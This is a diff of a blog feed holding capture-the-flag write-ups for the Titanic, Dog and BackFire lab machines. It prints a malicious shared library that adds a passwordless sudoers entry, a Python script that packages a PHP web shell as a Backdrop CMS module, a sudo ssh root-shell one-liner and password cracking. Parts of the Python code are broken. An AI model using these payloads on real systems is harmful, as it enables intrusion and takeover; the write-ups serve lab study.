+<p><img src="/assets/images/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9_image_17.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9_image_18.png" alt="image.png" /></p>
+
+<p>We have control over the current directory where it is executing, use the POC to create a malicious shared library</p>
+
+<p><img src="/assets/images/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9_image_19.png" alt="image.png" /></p>
+
+<p>Wait a little bit until it is compiled and get the root flag</p>
+
+<p><img src="/assets/images/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9_image_20.png" alt="image.png" /></p>
+
+<p>Another way to do it, giving a root shell to developer user</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("echo 'developer ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers");
+}
 </code></pre></div></div>
 
-<p>We got the hash for admin, we solve using</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john hash.txt <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc <span class="nt">-fPIC</span> <span class="nt">-shared</span> <span class="nt">-o</span> ./libxcb.so.1 a.c <span class="nt">-nostartfiles</span>
 </code></pre></div></div>
 
-<p>We use ssh to break into</p>
+<p>Machine pwned!!!@</p>]]></content><author><name>GitHub User</name></author><category term="writeups" /><summary type="html"><![CDATA[Titanic]]></summary></entry><entry><title type="html">Dog 207b952552918059ae99cbb25a8392ef</title><link href="https://your-site-url/writeups/2025/07/17/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e.html" rel="alternate" type="text/html" title="Dog 207b952552918059ae99cbb25a8392ef" /><published>2025-07-17T16:05:57+00:00</published><updated>2025-07-17T16:05:57+00:00</updated><id>https://your-site-url/writeups/2025/07/17/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e</id><content type="html" xml:base="https://your-site-url/writeups/2025/07/17/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e.html"><![CDATA[<h1 id="dog">Dog</h1>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh josh@10.10.11.230
+<h1 id="1-enumeration">1. Enumeration</h1>
+
+<p>Start enumerating ports, there are only two open ports, check the web application at first instance</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image.png" alt="image.png" /></p>
+
+<p>A blog talking about dogs and their issues</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_1.png" alt="image.png" /></p>
+
+<p>We can login and reset password, but apparently we cannot register ourselves</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_2.png" alt="image.png" /></p>
+
+<p>It is powered by backdrop Content Management System which is open source written in php</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_3.png" alt="image.png" /></p>
+
+<p>We can see its repository on github, and perform a quick checking of access to files that we don’t suppose to, we even have access to <code class="language-plaintext highlighter-rouge">robots.txt</code> but not useful information were found in there</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_4.png" alt="image.png" /></p>
+
+<p>We have access to <code class="language-plaintext highlighter-rouge">.git</code> directory which means that we can extract full repository content from here</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_5.png" alt="image.png" /></p>
+
+<p>Without using tools yet we have got a username</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_6.png" alt="image.png" /></p>
+
+<h1 id="2-user-flag">2. User flag</h1>
+
+<p>Using <code class="language-plaintext highlighter-rouge">git-dumper</code> we can extract all source code into a directory</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_7.png" alt="image.png" /></p>
+
+<p>We can perform a manual scanning review on configuration and settings file, where we found a password</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_8.png" alt="image.png" /></p>
+
+<p>A hash salt is also present</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_9.png" alt="image.png" /></p>
+
+<p>We need to find usernames in here, the first we found didn’t work, use the domain as filter to find <code class="language-plaintext highlighter-rouge">Tiffany</code></p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_10.png" alt="image.png" /></p>
+
+<p>Her email address is in an update settings file</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_11.png" alt="image.png" /></p>
+
+<p>Log in the graphical interface as Tiffany</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_12.png" alt="image.png" /></p>
+
+<p>We have a lot of users with “administrator” role in here</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_13.png" alt="image.png" /></p>
+
+<p>Until now, we haven’t found CMS version, use this same filter to find an authenticated Remote Code Execution</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_14.png" alt="image.png" /></p>
+
+<p>We have and exploit that creates a php reverse shell and a module.info file, packages them into a zip archive and install it as a module, Once installed the reverse can be triggered by simply sending a GET request to the file</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">import</span> <span class="nn">zipfile</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="k">def</span> <span class="nf">create_files</span><span class="p">():</span>
+	<span class="n">info_content</span> <span class="o">=</span> <span class="s">"""
+    type = module
+    name = Block
+    description = Controls the visual building blocks a page is constructed
+    with. Blocks are boxes of content rendered into an area, or region, of a
+    web page.
+    package = Layouts
+    tags[] = Blocks
+    tags[] = Site Architecture
+    version = BACKDROP_VERSION
+    backdrop = 1.x
+
+    configure = admin/structure/block
+
+    ; Added by Backdrop CMS packaging script on 2024-03-07
+    project = backdrop
+    version = 1.27.1
+    timestamp = 1709862662
+    """</span>
+    <span class="n">shell_info_path</span> <span class="o">=</span> <span class="s">"shell/shell.info"</span>
+    <span class="n">os</span><span class="p">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">dirname</span><span class="p">(</span><span class="n">shell_info_path</span><span class="p">),</span> <span class="n">exist_ok</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">shell_info_path</span><span class="p">,</span> <span class="s">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
+	    <span class="nb">file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">info</span><span class="p">.</span><span class="n">content</span><span class="p">)</span>
+	  
+	  <span class="n">shell_content</span> <span class="o">=</span>  <span class="s">"""
+    &lt;html&gt;
+    &lt;body&gt;
+    &lt;form method="GET" name="&lt;?php echo basename($_SERVER['PHP_SELF']); ?&gt;"&gt;
+    &lt;input type="TEXT" name="cmd" autofocus id="cmd" size="80"&gt;
+    &lt;input type="SUBMIT" value="Execute"&gt;
+    &lt;/form&gt;
+    &lt;pre&gt;
+    &lt;?php
+    if(isset($_GET['cmd']))
+    {
+    system($_GET['cmd']);
+    }
+    ?&gt;
+    &lt;/pre&gt;
+    &lt;/body&gt;
+    &lt;/html&gt;
+    """</span>
+    <span class="n">shell_php_path</span> <span class="o">=</span> <span class="s">"shell/shell.php"</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">shell_php_path</span><span class="p">,</span> <span class="s">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
+	    <span class="nb">file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">shell_content</span><span class="p">)</span>
+	  <span class="k">return</span> <span class="n">shell_info_path</span><span class="p">,</span> <span class="n">shell_php_path</span>
+
+<span class="k">def</span> <span class="nf">create_zip</span><span class="p">(</span><span class="n">info_path</span><span class="p">,</span> <span class="n">php_path</span><span class="p">):</span>
+	<span class="n">zip_filename</span> <span class="o">=</span> <span class="s">"shell.zip"</span>
+	<span class="k">with</span> <span class="n">zipfile</span><span class="p">.</span><span class="n">Zipfile</span><span class="p">(</span><span class="n">zip_filename</span><span class="p">,</span> <span class="s">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="n">zipf</span><span class="p">:</span>
+		<span class="n">zipf</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">info_path</span><span class="p">,</span> <span class="n">arcname</span><span class="o">=</span><span class="s">'shell/shell.info'</span><span class="p">)</span>
+		<span class="n">zipf</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">php_path</span><span class="p">,</span> <span class="n">arcname</span><span class="o">=</span><span class="s">'shell/shell.php'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+	<span class="k">print</span><span class="p">(</span><span class="s">"Remote command execution exploit"</span><span class="p">)</span>
+	<span class="k">print</span><span class="p">(</span><span class="s">"Evil module generating..."</span><span class="p">)</span>
+	
+	<span class="n">info_path</span><span class="p">,</span> <span class="n">php_path</span> <span class="o">=</span> <span class="n">create_files</span><span class="p">()</span>
+	<span class="n">zip_filename</span> <span class="o">=</span> <span class="n">create_zip</span><span class="p">(</span><span class="n">info_path</span><span class="p">,</span> <span class="n">php_path</span><span class="p">)</span>
+	
+	<span class="k">print</span><span class="p">(</span><span class="s">"Evil module generated!"</span><span class="p">,</span> <span class="n">zip_filename</span><span class="p">)</span>
+	<span class="k">print</span><span class="p">(</span><span class="s">"Go to "</span> <span class="o">+</span> <span class="n">url</span> <span class="o">+</span> <span class="s">"/admin/modules/install and upload the "</span> <span class="o">+</span>
+          <span class="n">zip_filename</span> <span class="o">+</span> <span class="s">" for Manual Installation."</span><span class="p">)</span>
+    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="s">"Your shell address:"</span><span class="p">,</span> <span class="n">url</span> <span class="o">+</span> <span class="s">"/modules/shell/shell.php"</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span>
+		<span class="k">print</span><span class="p">(</span><span class="s">"Usage: python script.py [url]"</span><span class="p">)</span>
+	<span class="k">else</span><span class="p">:</span>
+		<span class="n">main</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
 </code></pre></div></div>
 
-<h2 id="4-priv-esc">4: Priv esc</h2>
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_15.png" alt="image.png" /></p>
 
-<ul>
-  <li>Using sudo -l</li>
-</ul>
+<p>The zip file were generated and it indicates to go ourselves to install the module to be aware of what is happening. In this dashboard section we find a warning announcing that zip files are not allowed due to its extension is not loaded</p>
 
-<p><img src="/assets/images/cozyhosting/Untitled%208.png" alt="Untitled" /></p>
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_16.png" alt="image.png" /></p>
 
-<ul>
-  <li>In <a href="https://gtfobins.github.io/gtfobins/ssh/#sudo">https://gtfobins.github.io/gtfobins/ssh/#sudo</a> We find a way to get root access easily</li>
-</ul>
+<p>Try with manual installation</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>ssh <span class="nt">-o</span> <span class="nv">ProxyCommand</span><span class="o">=</span><span class="s1">';sh 0&lt;&amp;2 1&gt;&amp;2'</span> x
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_17.png" alt="image.png" /></p>
+
+<p>Only <code class="language-plaintext highlighter-rouge">.tar.gz</code> files are allowed</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_18.png" alt="image.png" /></p>
+
+<p>Use the files that previously generated by the python script and transform them into the required compatible format</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_19.png" alt="image.png" /></p>
+
+<p>Once the installation is completed successfully</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_20.png" alt="image.png" /></p>
+
+<p>Access to the shell using the <code class="language-plaintext highlighter-rouge">cmd</code> variable, during enumeration of users with valid shells, we identify johncusack, further investigation revealed that this user reused Tiffany’s password, which allowed successful ssh authentication</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_21.png" alt="image.png" /></p>
+
+<h1 id="3priv-esc">3.Priv esc</h1>
+
+<p>As johncusack user we can run as root bee binary</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_22.png" alt="image.png" /></p>
+
+<p>Basically this tool helps developers to automate tasks, execute code and access content efficiently in backdrop CMS</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_23.png" alt="image.png" /></p>
+
+<p>After checking its flags we found that it allows to execute php eval function</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_24.png" alt="image.png" /></p>
+
+<p>Immediately we ran <code class="language-plaintext highlighter-rouge">system(”id”)</code> command in the home directory but it didn’t work</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_25.png" alt="image.png" /></p>
+
+<p>So we checked the status of the installation, and received a message pointing out that the command should be run where the backdrop files are located</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_26.png" alt="image.png" /></p>
+
+<p>No it is working</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_27.png" alt="image.png" /></p>
+
+<p>Root shell is as simple as</p>
+
+<p><img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_28.png" alt="image.png" /></p>
+
+<p>Machine pwned!!!@#</p>]]></content><author><name>GitHub User</name></author><category term="writeups" /><summary type="html"><![CDATA[Dog]]></summary></entry><entry><title type="html">BackFire 19db9525529180c59281c89bbc555f9c</title><link href="https://your-site-url/writeups/2025/07/16/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001.html" rel="alternate" type="text/html" title="BackFire 19db9525529180c59281c89bbc555f9c" /><published>2025-07-16T16:05:57+00:00</published><updated>2025-07-16T16:05:57+00:00</updated><id>https://your-site-url/writeups/2025/07/16/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001</id><content type="html" xml:base="https://your-site-url/writeups/2025/07/16/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001.html"><![CDATA[<h1 id="backfire">BackFire</h1>
+
+<h1 id="1-enumeration">1. Enumeration</h1>
+
+<p>Start enumerating ports, there are two web applications running on it, an a filtered port which could be a clue for potential SSRF</p>
+
+<p><img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image.png" alt="image.png" /></p>
+
+<p>On port 443 there are nothing at first instance</p>
+
+<p><img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_1.png" alt="image.png" /></p>
+
+<p>On 8000 port we can find two files, one that seems to be a havoc configuration file, and other one that is a patch that disables tls</p>
+
+<p><img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_2.png" alt="image.png" /></p>
+
+<p>In this file there are credentials, no we have to find a place to authenticate, we can also notice that a port is shown but is not open at least to public</p>
+
+<p><img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_3.png" alt="image.png" /></p>
+
+<p>Thanks to colordiff tool we could see better what is removed and added in this patch file</p>
+
+<p><img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_4.png" alt="image.png" /></p>
+
+<p>Havoc is a modern and malleable post-exploitation command and control framework</p>
+
+<p><img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_5.png" alt="image.png" /></p>
+
+<h1 id="2-user-flag">2. User flag</h1>
+
+<p>Searching around, there is a CVE that points to something we are looking for</p>
+
+<p><img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_6.png" alt="image.png" /></p>
+
+<p>We need to know how it is working to perform a success attack</p>
+
+<p><img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_7.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_8.png" alt="image.png" /></p>
+
+<p>We need to make it fetch a rev shell in our machine</p>
+
+<p><img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_9.png" alt="image.png" /></p>
+
+<p>Use creds found and as it is a SSRF put the local service on the target machine with its port, this port is disclosed in the patch server where TLS is disable</p>
+
+<p><img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_10.png" alt="image.png" /></p>
+
+<p>It is performing an injection in the target host updating and executing payload.sh in server team service</p>
+
+<p><img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_11.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_12.png" alt="image.png" /></p>
+
+<p>Now we are ilya, update a public key and sign in using ssh</p>
+
+<p><img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_13.png" alt="image.png" /></p>
+
+<h1 id="3priv-esc">3.Priv esc</h1>
+
+<p>A clue about a way to escalate privileges, a local service is running</p>
+
+<p><img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_14.png" alt="image.png" /></p>
+
+<p>A new port in here</p>
+
+<p><img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_15.png" alt="image.png" /></p>
+
+<p>Forward that port</p>
+
+<p><img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_16.png" alt="image.png" /></p>
+
+<p>Now we need a way to bypass this login page</p>
+
+<p><img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_17.png" alt="image.png" /></p>
+
+<p>There is a way crafting a jwt in /login/register path</p>
+
+<p>But it looks like this path is no available in port 7096</p>
+
+<p><img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_18.png" alt="image.png" /></p>
+
+<p>Another port that is filtered to public but available now is 5000, forward it</p>
+
+<p><img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_19.png" alt="image.png" /></p>
+
+<p>This register endpoint is available in here, use this poc to create a new user with administrative privileges</p>
+
+<p><img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_20.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_21.png" alt="image.png" /></p>
+
+<p>Hardhat is a command and control framework, and has its own shell, we also can see that this shell is run by serge user</p>
+
